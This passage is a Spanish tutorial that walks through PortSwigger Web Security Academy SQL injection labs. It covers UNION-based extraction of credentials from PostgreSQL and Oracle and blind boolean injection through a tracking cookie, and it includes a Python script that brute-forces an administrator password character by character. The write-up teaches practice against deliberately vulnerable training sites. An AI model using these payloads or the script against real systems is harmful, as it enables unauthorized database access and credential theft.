> Puse la consulta en este formato, ya que es muy grande, y recuerda que no es necesario indicar la base de datos cuando las tablas que buscas están en la base de datos ya en uso, pero en este caso lo use para que se entienda bien todo y para que nos muestre solo las tablas de la base de datos que nos interesa y no de todas las bases de datos.

Lo que estamos haciendo es primero en el lugar de la primera columna nos mostrara las tablas, estas tablas las obtendremos de la base de datos **information_schema** y dentro de su tabla **tables**, obtendremos las tablas donde el nombre de la base de datos **table_schema** se llame **public**.

Y estas son las tablas que obtendremos:

![respuesta5](/assets/images/SQLiPortswigger/lab9/respuesta5.png)

Vemos que obtuvimos las tablas:

- products
- users_lwkejd

De la base de datos **public**.

Ahora que ya conocemos la tabla que nos importa **users_lwkejd** toca descubrir sus columnas, así como lo vemos en la siguiente consulta:

`https://web-security-academy.net//filter?category=Gifts' UNION SELECT column_name,'texto 2' FROM information_schema.columns WHERE table_schema = 'public' AND table_name = 'users_lwkejd' -- -`

Aquí le estamos indicando que ahora en la parte de la primera columna nos mostrara las columnas, estas columnas las obtendrá de la base de datos **information_schema** en su tabla **columns**, obtendremos las columnas donde el nombre de la base de datos **table_schema** se llame **public**, y después agregamos el operador AND, para indicarle que también donde la tabla se llame **users_lwkejd**, y esto nos responderá:

![respuesta6](/assets/images/SQLiPortswigger/lab9/respuesta6.png)

Podemos ver abajo en el lugar de la primera columna que hemos obtenido los nombres de las columnas de la tabla **users_lwkejd**, que en este caso las columnas son:

- **username_nemdqx**
- **password_ypezho**

Ahora solo queda dumpear los datos de esas columnas, que haremos con la siguiente consulta:

`https://web-security-academy.net//filter?category=Gifts' UNION SELECT username_nemdqx,password_ypezho FROM public.users_lwkejd -- -`

Aquí le estamos indicando que nos muestre lo que hay en las columnas **username_nemdqx** y **password_ypezho** reemplazándolos en lugar de las columnas originales, bueno más bien mezclando, después le decimos que esto lo obtendrá de la base de datos **public** en la tabla **users_lwkejd**, y podremos dumpeaer las credenciales como vemos aquí:

![dump](/assets/images/SQLiPortswigger/lab9/dump.png)

Como podemos apreciar hemos dumpeado los datos de dichas columnas, y ya solo queda tomar las credenciales del usuario **administrator** para terminar el laboratorio:

![final](/assets/images/SQLiPortswigger/lab9/final.png)

<br>

<div id='id10' />

# Laboratorio 10: Ataque de inyección SQL, enumerando el contenido de la base de datos en Oracle

Este laboratorio es similar al anterior, con la diferencia de que ahora enumeraremos datos de una base de datos que es Oracle.

En este caso no es necesario descubrir que versión usa, ya que el mismo reto nos lo dice, por lo que iremos directamente a descubrir cuantas tablas se devuelven en la parte vulnerable, en este caso descubrimos que son 2:

![lab10](/assets/images/SQLiPortswigger/lab10/lab10.png)

Podemos apreciar que son 2, como hemos visto anteriormente, el título, y su respectiva descripción, por lo que hay 2 columnas seguramente de tipo string, esto lo hemos comprobado.

Ahora que sabemos esto, lo que debemos hacer es como sabemos hacer una unión de las columnas que seleccionemos usando **UNION SELECT**, pero como recordamos cuando la versión es Oracle debemos hacerlo un poco distinto.

Cuando se trata de Oracle debemos indicarle una tabla, esta tabla es una que está presente en la mayoría de bases de datos Oracle la cual es **dual**, y la podremos llamar para ejecutar nuestra consulta quedando así:

`https://web-security-academy.net/filter?category=Gifts' UNION SELECT 'texto 1','texto 2' FROM dual -- -`

Y al hacer esta petición veremos en su respuesta:

![respuesta1](/assets/images/SQLiPortswigger/lab10/respuesta1.png)

> No le especificamos que registro o fila a esa tabla ya que esa tabla contiene solo una fila la cual se toma por defecto.

Podemos apreciar hasta abajo que nos interpreta lo que le hemos dicho, ya que sabemos que estas columnas son tipo string, pero lo que nos interesa ahora es listar las bases de datos, por lo que haremos la siguiente consulta:

`https://web-security-academy.net/filter?category=Gifts' UNION SELECT owner,'texto 2' FROM all_tables -- -`

> Recuerda que en Oracle o dependiendo de que versión sea cambia la sintaxis de enumeración de bases de datos, lo puedes ver en la hoja de trucos, en este caso usamos all_tables y no inforamtion_schema.tables.

En este caso usamos **owner**, para que nos liste los propietarios de las tablas, ya que si ponemos table_name en vez de owner nos mostrara todas las tablas y tardaremos en encontrar la que nos interesa, por lo que al hacer esta consulta nos mostrara los propietarios de las tablas que existen:

![owners](/assets/images/SQLiPortswigger/lab10/owners.png)

Como vemos podemos apreciar múltiples propietarios de distintas tablas, entre estos propietarios están:

- **XDB**
- **SYSTEM**
- **SYS**
- **PETER**
- **MDSYS**
- **APEX_040000**
- **CTXSYS**

Podemos ver que existen múltiples propietarios de distintas tablas, probaremos con la de **PETER**, ya que es diferente a las demás, por lo que pondremos esta condición de que nos muestre las tablas donde el propietario sea **PETER**:

`https://web-security-academy.net/filter?category=Gifts' UNION SELECT table_name,'texto 2' FROM all_tables WHERE owner = 'PETER' -- -`

Y al hacer esta consulta nos dumpeara las tablas pertenecientes a este propietario:

![PETER](/assets/images/SQLiPortswigger/lab10/PETER.png)

Podemos apreciar que nos dumpeo 2 tablas de este propietario:

- **PRODUCTS**
- **USERS_KXSGFS**

Por lo que nos llama la atención la tabla de **USERS_KXSGFS**, así que haremos una consulta para dumpear sus columnas:

`https://web-security-academy.net/filter?category=Gifts' UNION SELECT column_name,'texto 2' FROM all_tab_columns WHERE owner = 'PETER' AND table_name = 'USERS_KXSGFS' -- -`

En esta consulta cambiamos que nos muestre las tablas por las columnas, y después esas columnas las obtendrá de **all_tab_columns**, que en este caso es distinto a **information_schema.columns**, ya que es distinta versión y podemos comprobar esto en la hoja de trucos, por lo que ahora aparte de que el propietario sea **PETER** también le indicamos que donde el nombre de la tabla sea **USERS_KXSGFS** entonces nos muestre esos datos, por lo que veremos en la respuesta:

![columns](/assets/images/SQLiPortswigger/lab10/all_tab_columns.png)

Y podemos ver que hemos dumpeado 2 columnas:

- **USERNAME_BZAJCR**
- **PASSWORD_KYCHOY**

Por lo que ya solo nos quedaría dumpear los datos de dichas columnas:

`https://web-security-academy.net/filter?category=Gifts' UNION SELECT USERNAME_BZAJCR,PASSWORD_KYCHOY FROM USERS_KXSGFS -- -`

Estamos diciendo que nos muestre los datos de las columnas **USERNAME_BZAJCR** y **PASSWORD_KYCHOY** de la tabla **USERS_KXSGFS**, y entonces veremos:

![respuesta2](/assets/images/SQLiPortswigger/lab10/respuesta2.png)

Y usamos las credenciales de **administrator** para terminar este laboratorio:

![final](/assets/images/SQLiPortswigger/lab10/final.png)

Y hemos terminado este laboratorio.

<br>

<div id='id11' />

# Laboratorio 11: inyección SQL ciega con respuestas condicionales

En este laboratorio el método cambiará completamente, ya que como es inyección ciega, no podremos ver en pantalla la respuesta de la consulta como lo hemos estado haciendo anteriormente, primero en este nivel nos dice lo siguiente:

![lab11](/assets/images/SQLiPortswigger/lab11/lab11.png)

Podemos apreciar que nos dice que esta vez la vulnerabilidad SQLi no está dentro del filtro de categorías, sino que esta vez se trata de una cookie, por detrás de la consulta esta toma la cookie para usarla, pero lo que nos interesa es que la consulta toma la cookie y nosotros podemos interceptar esta cookie para inyectar nuestras consultas.

También nos dice que tenemos una tabla llamada **users**, que contiene 2 columnas, llamadas **username** y **password**, por lo que ya tenemos algo con lo que atacar, dice que para completar este laboratorio debemos sacar la contraseña del usuario **administrator** y loguearnos en el panel login.

<br>

También nos da una pequeña sugerencia:

![sugerencia](/assets/images/SQLiPortswigger/lab11/sugerencia.png)

Nos dice que la contraseña contiene caracteres alfanuméricos, por lo que solo usa letras y números.

Primero debemos configurar algún navegador para que pase por el proxy de burpsuite y nos intercepte las peticiones que hagamos a través de ese proxy, en este caso tengo configurado el firefox con la extensión foxyproxy para interceptar peticiones, pero también puedes usar el navegador que viene dentro de burpsuite.

<br>

Primero abriremos la pagina web del laboratorio:

![web](/assets/images/SQLiPortswigger/lab11/web.png)

Como vemos es una página parecida a las que ya hemos visto, por lo que interceptaremos esta petición y veremos lo siguiente:

![intercept](/assets/images/SQLiPortswigger/lab11/intercept.png)

Podemos ver que nos está interceptando la petición web, y dentro vemos la cookie que usa la consulta SQL, así que la enviaremos al repeater para repetir esta petición cuantas veces queramos con ctrl + r la enviamos, y desde aquí haremos todo, primero veremos que sucede si enviamos la petición normal sin modificar nada:

![i1](/assets/images/SQLiPortswigger/lab11/i1.png)

Podemos apreciar a la izquierda la petición web que hemos interceptado, y a la derecha la respuesta en formato renderizado, o sea mostrándonos como se vería en la web, vemos que nos muestra lo que ya hemos visto, pero ahora vemos algo que es lo que dice "Welcome Back!", así que tendremos eso en cuenta, ahora a la izquierda donde nos muestra el valor de la cookie algo así:

`TrackingId=xyz`

Hemos acortado el valor para ahorrar espacio, podemos apreciar que esta este parámetro llamado **TrackingId**, el cual contiene un valor, por lo que intentaremos algo, y esto es agregar una comilla para ver si podemos romper la cookie y hacer fallar la consulta y nos responda algo diferente, nuestra cookie quedara así:

`TrackingId=xyz'`

Y esto nos responderá:

![i2](/assets/images/SQLiPortswigger/lab11/i2.png)

Podemos apreciar que esta vez el mensaje de "Welcome Back!" ha desaparecido, lo cual nos da a pensar que había una consulta que obtenía dicho valor de la cookie, pero al ser incorrecto genera un false por detrás de la consulta sin devolvernos dicho mensaje, por lo que ahora trataremos de inyectar consultas.

Podemos intuir que por detrás podría suceder una consulta así:

`SELECT * FROM products WHERE TrackingId='xyz'`

Y gracias a la comilla que hemos agregado la consulta por detrás se vería como:

`SELECT * FROM products WHERE TrackingId='xyz''`

Vemos que la comilla que hemos agregado cierra el valor de TrackingId, dejando la comilla que ya estaba por defecto colgada a la parte derecha, por este motivo esta consulta nos da error y como devuelve error no nos muestra nada, ya que no reconoce esta cookie, así que ahora lo que intentaremos es lo siguiente:

`SELECT * FROM products WHERE TrackingId='xyz' AND 1=1-- -'`

Podemos apreciar que hemos agregado una parte de consulta diciendo que nos diga si 1 es igual a 1, lo cual claramente es que si y esto lo hacemos para que nos marque como correcta la consulta, y comentamos la comilla que queda colgada por detrás para evitar un error de sintaxis y como vemos en la petición interceptada nos responderá esto al enviar esta petición:

![i3](/assets/images/SQLiPortswigger/lab11/i3.png)

Y ahora vemos que nos responde con el "Welcome Back!"ya que la cookie está mal, pero hemos inyectado el operador **AND** junto con una consulta que claramente nos dará un resultado **true**, por lo que la consulta por detrás se marcó como **true** haciendo que nos muestre dicho contenido, o sea el mensaje, y también esto nos sirve de que tenemos un apartado donde inyectar consultas y sabremos si lo que hay dentro es **true** o **false** basándonos en el mensaje de bienvenida.

Sabemos que si nos muestra el mensaje significa **true**, y si le damos algo que dará **false** en la consulta como por ejemplo, cambiar el 1=1 por 2=1, obviamente 2 no es igual a 1 por lo que nos dará error y no nos mostrara el mensaje de bienvenida:

![i4](/assets/images/SQLiPortswigger/lab11/i4.png)

Como vemos obviamente nos da error y no nos muestra lo que haría la consulta en caso de ser **true**, pero no lo es y por eso no se muestra.

<br>

Ahora que sabemos que podemos basarnos en este mensaje de bienvenida procederemos a inyectar cosas más interesantes, sabemos que hay una tabla llamada **users**, por lo que haremos lo siguiente:

`TrackingId=xyz' AND (SELECT '1' FROM users limit 1)='1`

Primero estamos haciendo una sub consulta en medio de los paréntesis, y dentro de ella decimos que nos tome el valor por ejemplo '1' y que esta selección la haga dentro de la tabla **users** que como sabemos existe, limitando el resultado al primer registro, ya que debe tener algo en que dejar ese valor, y después si esto que hicimos en la consulta se puede cumplir sin errores o sea **FROM users limit 1**, entonces nos permitirá comparar si ese valor '1' es igual al '1' que está fuera de la consulta, así que al interpretarse la sub consulta, y en caso de que lo de la sub consulta sea **true** entonces la consulta normal será algo como **AND '1'='1'**, el primer uno se tomara en cuenta siempre y cuando lo de su sub consulta se cumpla, ya que de lo contrario daría error y se estaría comparando un error con el valor '1' que hay fuera de la sub consulta y obviamente nos daría **false** sin mostrarnos el mensaje de bienvenida.

> Al final de la consulta en el valor 1 vemos que solo le hemos puesto una comilla, y esto es porque como sabemos al romper la consulta estaríamos dejando una comilla colgada por detrás, así que solo abrimos la primera comilla y dejamos el espacio para que la comilla que queda colgada por detrás cierre esa parte, y tener que evitar usar los **-- -** para alargar la consulta.

Así que esto nos respondería lo siguiente:

![i5](/assets/images/SQLiPortswigger/lab11/i5.png)

Esto quiere decir que existe la tabla **users**, ahora probaremos lo siguiente:

`TrackingId=xyz' AND (SELECT SUBSTRING(username,1,1) FROM users limit 1)='a`

Aquí vemos un par de cosas nuevas, primero, dentro de la subconsulta, usamos la función **substring()**, y lo que hace esta función es obtener los valores por separado de una cierta cadena de texto, por ejemplo en este ejemplo de la función **SELECT SUBSTRING("Hola mundo", 1, 3)**, en este ejemplo estamos seleccionando lo que nos devolverá la función, dentro de la función la cadena será "Hola mundo" para después con el segundo parámetro el cual es 1, indicando que queremos que empiece desde el primer carácter, o sea "H", y el valor 3 indica la cantidad a mostrar después de ese primer carácter, en este caso el resultado de esto sería: "Hol".

Ahora que sabemos el uso de esta función, volvamos a la sub consulta:

`TrackingId=xyz' AND (SELECT SUBSTRING(username,1,1) FROM users limit 1)='a`

Recordemos que aquí estamos seleccionando lo que nos devuelva la función **substring()**, dentro de esta función le decimos que empiece a tomar del primer carácter, y queremos que nos tome solo 1 carácter, después esto lo tomaremos del primer registro de la tabla **users**, cuando digo registro me refiero a la primera fila de dicha tabla.

Lo que hacemos es que seleccionamos lo que nos devuelve la función **substring()** de la sub consulta, y esto lo sacara  de la primera fila de la columna **username**, así que estamos obteniendo el primer carácter de la primera fila gracias a limit 1, y esto será donde la columna sea **username**, hacemos el limit 1 para ir de uno en uno y que no nos dé error al llamar a todos.

Después de que obtengamos ese carácter verificaremos si ese caracter es igual que al que esta al final de la sub consulta, en este caso es "a".

Así que en caso de que lo que nos devuelva el primer carácter de la sub consulta sea "a" entonces se verificara que es igual al carácter que está fuera de la sub consulta, o sea "a", entonces nos dará **true** por lo que nos mostrara el mensaje de bienvenida, ya que de lo contrario que el primer carácter de lo que devuelve la sub consulta no sea "a", dará error, ya que no será igual al valor del final de la sub consulta o sea "a".

<br>

Así que en base a esto, podemos hacer algo para ir verificando carácter por carácter y en base al mensaje de bienvenida saber que usuario es el del primer registro de la tabla **users** en base a su columna **username**.

Podemos ir fuzzeando el nombre del primer registro manualmente así:

`TrackingId=xyz' AND (SELECT SUBSTRING(username,1,1) FROM users limit 1)='a`

Vemos que esta consulta es la misma que explique arriba, pero ahora la usaremos para lo que queremos, primero indicamos que queremos comprobar si el primer carácter del primer registro donde la columna sea **username** en la tabla **users** es igual al carácter 'a'.

En caso de ser cierto nos mostrará esto la respuesta:

![i6](/assets/images/SQLiPortswigger/lab11/i6.png)

Vemos que nos muestra el mensaje de bienvenida, por lo que ese primer carácter si es igual a "a".

Así que ahora cambiaremos la consulta por:

`TrackingId=xyz' AND (SELECT SUBSTRING(username,2,1) FROM users limit 1)='a`

Que ahora los seleccione desde el segundo carácter, y solo queremos tomar un valor de ahí en adelante, esto es lo mismo, y como el segundo carácter no es "a", nos mostrara esto:

![i7](/assets/images/SQLiPortswigger/lab11/i7.png)

Por lo que probaremos otro carácter:

`TrackingId=xyz' AND (SELECT SUBSTRING(username,2,1) FROM users limit 1)='d`

Y nos responde:

![i8](/assets/images/SQLiPortswigger/lab11/i8.png)

Y vemos que el segundo carácter si es "d".

Por lo que nos podemos dar la idea de que el usuario es "administrator", así que modificaremos nuestra consulta:

`TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a`

Lo que hicimos fue volver a lo de 'a'='a' para comprobar si lo que hay en la sub consulta es **true**, en este caso agregamos que nos seleccione 'a' de la tabla sea **users** donde la columna **username** sea igual a el valor **"administrator"** y en caso de que esto exista pasara a comprobar nuestro primer valor 'a' con el segundo valor 'a', mostrándonos el mensaje de bienvenida:

![i9](/assets/images/SQLiPortswigger/lab11/i9.png)


<br>

Ahora que sabemos que el usuario es correcto, iremos a fuzzear su columna de **password**:

Primero obtendremos el tamaño de la contraseña, por lo que usaremos esta consulta:

`TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a`

Aquí estamos haciendo lo que ya sabemos de validar "a" = "a", para comprobar si la sub consulta devuelve un **true** o **false**, pero en este caso le estamos indicando que seleccione el valor "a" de la tabla **users** donde la columna **username** tenga de valor **"administrator"** entonces en ese lugar en caso de ser correcto lo anterior, pasara a el operador AND, diciendo que si la longitud del valor **password** dentro de ese registro que fuimos anteriormente es mayor a 2, en caso de ser cierto nos mostrara lo siguiente:

![length](/assets/images/SQLiPortswigger/lab11/length1.png)

Por lo que descubriremos probando así hasta llegar al número de caracteres de la contraseña del usuario administrator:

![length2](/assets/images/SQLiPortswigger/lab11/length2.png)

En este caso descubrimos que la contraseña es igual a 20 caracteres:

`TrackingId=FOOgF1BfxfMqbkj1' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>=20)='a`

Usamos el Mayor o igual para determinar la longitud y dimos con que era 20 caracteres.

<br>

Ahora que ya sabemos la longitud de la contraseña procederemos a descubrirla, primero usaremos esta consulta:

`TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a`

Lo que estamos haciendo aquí es decirle que nos seleccione el primer carácter de la columna **password** de la tabla **users** donde la columna **username** contenga el valor de **"administrator"**, para después comparar ese valor con el que está fuera de la sub consulta, en este caso es "a".

![p1](/assets/images/SQLiPortswigger/lab11/p1.png)

Y podemos ver que no nos muestra el mensaje de bienvenida, por lo que la contraseña del usuario administrator no inicia con una letra "a".

Esto es un poco cansado, probar letra por letra, y no solo pueden ser letras, ya que el laboratorio dice que igual puede contener números, por lo que es un texto alfanumérico, así que para facilitar esto vamos a crear un script en python que nos automaticé todo esto.

<br>

<div id='id1010' />

# Creando un script en python para automatizar la enumeración de la inyección SQL ciega

Nuestro código terminado se ve así:

```py
#!/usr/bin/python3

from pwn import *
import requests, signal, time, pdb, sys, string

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

#CTRL+C
signal.signal(signal.SIGINT, def_handler)

main_url = "https://0a8a00dc03454998c09f90e700180095.web-security-academy.net"
characters = string.ascii_lowercase + string.digits

def makeRequest():

    password = ""

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Password")

    for position in range(1,21):

        for character in characters:

            cookies = {
                'TrackingId': "EkppvYfQrcHQK79N' AND (SELECT SUBSTRING(password,%d,1) FROM users WHERE username='administrator')='%s" % (position, character),
                'session': '6Ditk4mK0zirtmo81PYSbUwnGni78Aqf'
            }

            p1.status(cookies['TrackingId'])

            r = requests.get(main_url, cookies=cookies)

            if "Welcome back!" in r.text:
                password += character
                p2.status(password)
                break

if __name__ == '__main__':

    makeRequest()
```
La primera línea del código es esto:

`#!/usr/bin/python3`

Le estamos indicando que al ejecutar el script este se ejecutara usando python3.

`from pwn import *`

Este módulo que hemos importado todo de el, tanto como funciones o variables contiene funciones para los atacantes, como conectarse a servidores por medio de diferentes protocolos tales como TCP o UDP, analizar paquetes de red, o también análisis de memoria para buscar y explotar vulnerabilidades, entre otras cosas más.

`import requests, signal, time, pdb, sys, string`

**requests**: Este módulo nos sirve para enviar solicitudes HTTP usando python, podemos enviar solicitudes en formato GET,POST,PUT,DELETE y otro tipo de solicitudes, también nos permite modificar la petición web que se hará.

**signal**: Este lo usaremos para que cuando hagamos ctrl + c, se nos detenga el programa en caso de requerirlo.

**time**: Con este módulo podremos manejar datos de tiempo, como la hora actual, pero en este caso lo usaremos para detener el tiempo del script cuando necesitemos esa función.

**pdb**: Este es un depurador de nuestro código para poder identificar en caso de que haya algún error donde esta y como corregirlo.

**sys**: Esto nos sirve para redirigir los errores, por ejemplo, en caso de error usar la función exit(1).

**string**: Esto nos permite trabajar y manipular cadenas de texto, en este caso lo usaremos para ir manejando por las posiciones de las cadenas.

<br>

La primera función que definiremos se llama **def_handler**, que le estamos pasando 2 argumentos, sig y frame, después lo que hará esta función es mostrarnos un mensaje que diga "[!] Saliendo..." y después hacer una salida con un estado de error, `sys.exit(1)`

Después de terminar esa función, abajo agregamos esta línea:

`signal.signal(signal.SIGINT, def_handler)`

Esto es para esperar cuando se presione CTRL + C entonces se llamara a la función **def_handler** que definimos anteriormente.

<br>

Después creamos una variable de tipo string con este contenido:

`main_url = "https://0a8a00dc03454998c09f90e700180095.web-security-academy.net"`

Lo que es esto es la petición que como sabemos es el inicio de la página donde está la vulnerabilidad de la cookie, la usaremos más adelante.

Después en otra esta variable que creamos le asignamos estos valores:

`characters = string.ascii_lowercase + string.digits`

Con el módulo string que importamos, usaremos 2 opciones de dicho módulo, el primero que es **string.ascii_lowercase** nos da todas las letras del alfabeto en minúsculas, y aparte de esos caracteres agregaremos todos los dígitos del 0 al 9, con **string.digits**, por lo que la variable **characters** contiene todas las letras del alfabeto en minúsculas y los números del 0 al 9, esto es para que sea nuestro diccionario de donde sacaremos la contraseña más adelante.

<br>

Después definiremos una función llamada **makeRequest()**, la cual dentro de ella estará todo esto:

Primero una variable llamada **password** vacía, ya que aquí iremos almacenando la contraseña a medida que descubramos carácter por carácter, por lo que necesita estar vacía para ir llenándose conforme se vaya ejecutando lo que sigue.

<br>

`p1 = log.progress("Fuerza bruta")`

Lo que hacemos aquí es crear un objeto de progreso llamado **p1**, con el título "Fuerza bruta", esto lo hace usando la función progress del módulo log, lo que hará esto es mostrarnos la barra de progreso en la ejecución del script con dicho título.

Después de esto haremos esto:

`p1.status("Iniciando ataque de fuerza bruta")`

Lo que hacemos aquí es establecer el estado del objeto de progreso llamado **p1**, en este caso lo que nos mostrara será el mensaje de **"Iniciando ataque de fuerza bruta"**.

`time.sleep(2)`

Después pausamos la ejecución del script por 2 segundos, para que se pueda leer el mensaje anterior.

<br>

Después crearemos otro objeto de progreso:

`p2 = log.progress("Password")`

Pero esta vez con el título de **"Password"**, el estado de este objeto de progreso se asignará ahora.

<br>

Como recordaremos, para descubrir el primer carácter de la contraseña del usuario **administrator** usamos la vulnerabilidad SQLi ciega de este laboratorio que era esto:

`TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a`

Entonces lo que debemos hacer es automatizar el cambio de posición de la substring de la contraseña y a la vez ir intentando con cada carácter posible, para eso creamos la variable **characters**, pero para ir cambiando de posiciones necesitaremos hacer lo siguiente:

`for position in range(1,21):`

Primero crearemos un ciclo for, este bucle itera en un rango del 1 al 20, que como recordamos es el tamaño de caracteres que descubrimos de la contraseña, y en cada iteración asigna el valor actual de la iteración a la variable position, que usaremos más adelante, así que esto será para recorrer cada carácter de la contraseña del usuario **administrator**.

<br>

Ahora haremos otro ciclo for anidado dentro del que hicimos anteriormente:

`for character in characters:`

Este otro ciclo lo que hará es iterar sobre cada posición dentro de la variable characters que es nuestro diccionario que contiene letras y números, y por cada valor que seleccione actual se guardara dentro de la variable **character**, esto lo usaremos más adelante para probar cada carácter de este diccionario en la posición actual de la contraseña.

<br>

Después crearemos un diccionario llamado **cookies**:

`cookies = {
'TrackingId': "EkppvYfQrcHQK79N' AND (SELECT SUBSTRING(password,%d,1) FROM users WHERE username='administrator')='%s" % (position, character),
'session': '6Ditk4mK0zirtmo81PYSbUwnGni78Aqf'
}`

Lo que hacemos aquí es crear el diccionario de cookies que pondremos en cada petición que se intente con cada carácter, lo que hicimos primero fue definir la entrada de la cookie con la clave **"TrackingId"** y esta tiene un valor, el cual es una string la cual definimos entre comillas dobles, después asignamos dentro de los valores que irán iterando cada posición y valor, por eso en la parte de **(SELECT SUBSTRING(password,%d,1)** vemos el **"%d"**, lo que significa que ahí se pondrá el valor de un dígito, el cual sabemos que será útil para ir cambiando de posición en la contraseña, y al final donde dice **WHERE username='administrator')='%s** vemos que agregamos el **"%s"** esto quiere decir que ahí se reemplazara una string, esto es para que nos vaya probando cada carácter de nuestra variable que creamos que contiene todos los caracteres alfanuméricos.

Después de definir esto asignaremos en orden los valores que se irán pasando a las posiciones anteriores: **% (position, character)** aquí con el símbolo de porcentaje le estamos indicando que los valores que asignamos anteriormente tendrán el valor de lo que está dentro de los paréntesis y esto debe ir en orden, primero pusimos el %d o sea que primero pondremos el dígito que lo obtendrá de la variable **position** del primer bucle for, después el siguiente valor que ira en %s de string irá el valor de la variable **character** del bucle for anidado, el cual contiene un carácter de la variable que contiene los caracteres alfanuméricos.

Lo que hará esto es primero con el primer bucle for posicionarse en la primera posición del rango contraseña, una vez en esa posición lo que hará es tomar el primer carácter con el segundo bucle for anidado y después generara dicho diccionario actual de cookies.

<br>

Después de que se genere el primer diccionario de cookie lo que hará es definir otra entrada la cual es **session**, pero este no necesitamos modificarlo, ya que será un valor fijo que no ocupamos modificar.

<br>

Después de definir el diccionario de cookies la siguiente línea será esto:

`p1.status(cookies['TrackingId'])`

Esto lo que hará es cambiar el estado del primer objeto de progreso, el cual ya no será "iniciando ataque de fuerza bruta", sino que será reemplazado por lo que se interpretará en este intento, lo cual ya interpretado nos mostrara algo así el script en funcionamiento:

`[◤] Fuerza bruta: EkppvYfQrcHQK79N' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a`

Vemos que nos cambió el estado del objeto de progreso llamado "Fuerza bruta", su estado antiguo era "Iniciando ataque de fuerza bruta", pero ahora hemos cambiado ese estado por lo que se intentará en esta próxima petición, y como vemos ya no están los valores que eran %d y %s, y esto es porque el intérprete de python ya nos ha asignado los valores que dimos y que irán cambiando cada vez a medida que se vayan descubriendo y esto lo veremos ahora.



Después de este estado lo que hará el script por detrás es interpretar estas siguientes líneas:

`r = requests.get(main_url, cookies=cookies)`

Primero hará una petición por el método GET, hacia la url que está dentro de la variable **main_url**, y asignándole unas cookies, las cuales le pasamos el diccionario **cookies** el cual como recordamos que está dentro de los for anidados nos hará esa petición con los valores que estén en este momento iterando sobre el diccionario y esta respuesta las guarda dentro de **"r"**.

<br>

Después de hacer esta petición:

`if "Welcome back!" in r.text:`

Comprobaremos si dentro del archivo generado en **"r"**, al cual accedemos con r.txt, comprobaremos si dentro de esa respuesta de la petición nos devolvió el texto "Welcome back!", que como sabemos este mensaje solo se mostraba en caso de que el carácter correcto este en la posición correcta de la contraseña.

Y en caso de que esto se cumpla porque la petición actual es correcta entonces hará lo siguiente:

`password += character`

Estamos agregando el carácter actual que es el correcto a la variable password, para que poco a poco se vaya completando la contraseña.

<br>

Ahora aquí:

`p2.status(password)`

Estamos cambiando el estado del objeto de progreso p2, el cual su estado anterior era password, pero ahora volverá a ser password, pero hacemos esto para que se actualice el valor recién encontrado y nos lo muestre en pantalla.

Después de esto debemos detener el for para que siga intentando pero ahora con la siguiente posición de la contraseña.

Por lo que:

`break`

Usamos break para que salga, ya que en caso de que entre al if que comprueba si el mensaje de bienvenida está en la respuesta entonces quiere decir que es el correcto y ya no tiene que seguir probando con otros caracteres, ya que hemos encontrado el correcto.

<br>

Ahora que hemos terminado de definir esta función llamada **makeRequests()**, solo nos queda mandarla a llamar en el menú del código:

`if __name__ == '__main__':`

y llamamos a la función:

`makeRequest()`

Después ejecutaremos el script y descubriremos la contraseña poco a poco hasta dar con ella y terminar este laboratorio.

<br>

<div id='id12' />

# Laboratorio 12: Inyección ciega de SQL con errores condicionales

<br>

En este laboratorio, como en los anteriores nos pide que descubramos la contraseña del usuario administrator en la tabla users, como podemos apreciar:

![lab12](/assets/images/SQLiPortswigger/lab12/lab12.png)

<br>

En este caso no hay mensaje de welcomeBack!, por lo que ya no será basada en respuestas condicionales, sino que ahora será basada en errores condicionales.

Lo primero que haremos será interceptar la petición de la página del laboratorio, ya que nos indica que existe una vulnerabilidad de SQLi en las cookies, por lo que con burpsuite interceptaremos la petición y la enviaremos al repeater:

![i1](/assets/images/SQLiPortswigger/lab12/intercept1.png)

Podemos ver que hemos interceptado la petición, también podemos leer la cookie, y como en el anterior laboratorio, primero intentaremos escapar de la consulta por defecto:

Por detrás debe haber una consulta algo así:

`SELECT * from products WHERE TrackingId=X3GUYDqzaHtN5MlA`

Pero lo que haremos nosotros como sabemos es agregar una comilla simple para primero ver que es lo que pasa:

`SELECT * from products WHERE TrackingId=X3GUYDqzaHtN5MlA'`

Y al enviar esta petición nos responde:

![i2](/assets/images/SQLiPortswigger/lab12/intercept2.png)

Vemos que nos marca un error, probé intentar con cosas que nos habían funcionado antes, como:

`SELECT * from products WHERE TrackingId=X3GUYDqzaHtN5MlA' AND 2=1-- -`

O también:

`SELECT * from products WHERE TrackingId=X3GUYDqzaHtN5MlA' AND '2'='1`

Nos mostraba la página, pero no tenía sentido esto, ya que a pesar de que 2 no es igual a 1 nos seguía mostrando como si fuese algo correcto, por lo que esta manera no nos ayuda para nada.

Así que intentemos cambiar de método.

<br>

En los ejercicios anteriores nos funcionaban esos métodos, pero siempre tuvimos la idea de que por detrás se usaba una sola comilla la cual al agregar otra es la que se quedaba colgada, pero en este caso intentamos esta petición:

`SELECT * from products WHERE TrackingId=X3GUYDqzaHtN5MlA''`

Y en vez de mostrarnos un error como lo hubiese hecho con una sola comilla, en este caso no nos mostró un error:

![i3](/assets/images/SQLiPortswigger/lab12/intercept3.png)

Vemos que sin problema nos valida esto, por lo que ya podemos pensar en algo, y esto sería agregar una subconsulta a la consulta, quedando así:

`SELECT * from products WHERE TrackingId=X3GUYDqzaHtN5MlA'||(SELECT '')||'`

En este caso solo estamos añadiendo una subconsulta usando el operador OR, estamos indicando algo simple que no nos debería dar ningún error, esto solo nos selecciona una cadena vacía por lo que no debería dar error, y esta es su respuesta:

![i4](/assets/images/SQLiPortswigger/lab12/intercept4.png)

Podemos ver que nos da un error, como podrás recordar no solo existen bases de datos MySQL, existen oracle, entre otras, y como recordamos en la hoja de trucos nos decía que para hacer una selección en una base de datos oracle era necesario indicar una tabla, la cual erá "dual", por lo que este error puede ser una señal de que no es una base de datos MySQL o microsoft, sino que puede ser probable que sea una oracle, así que agregamos la tabla por defecto que necesita oracle a la consulta:

`SELECT * from products WHERE TrackingId=X3GUYDqzaHtN5MlA'||(SELECT '' FROM dual)||'`

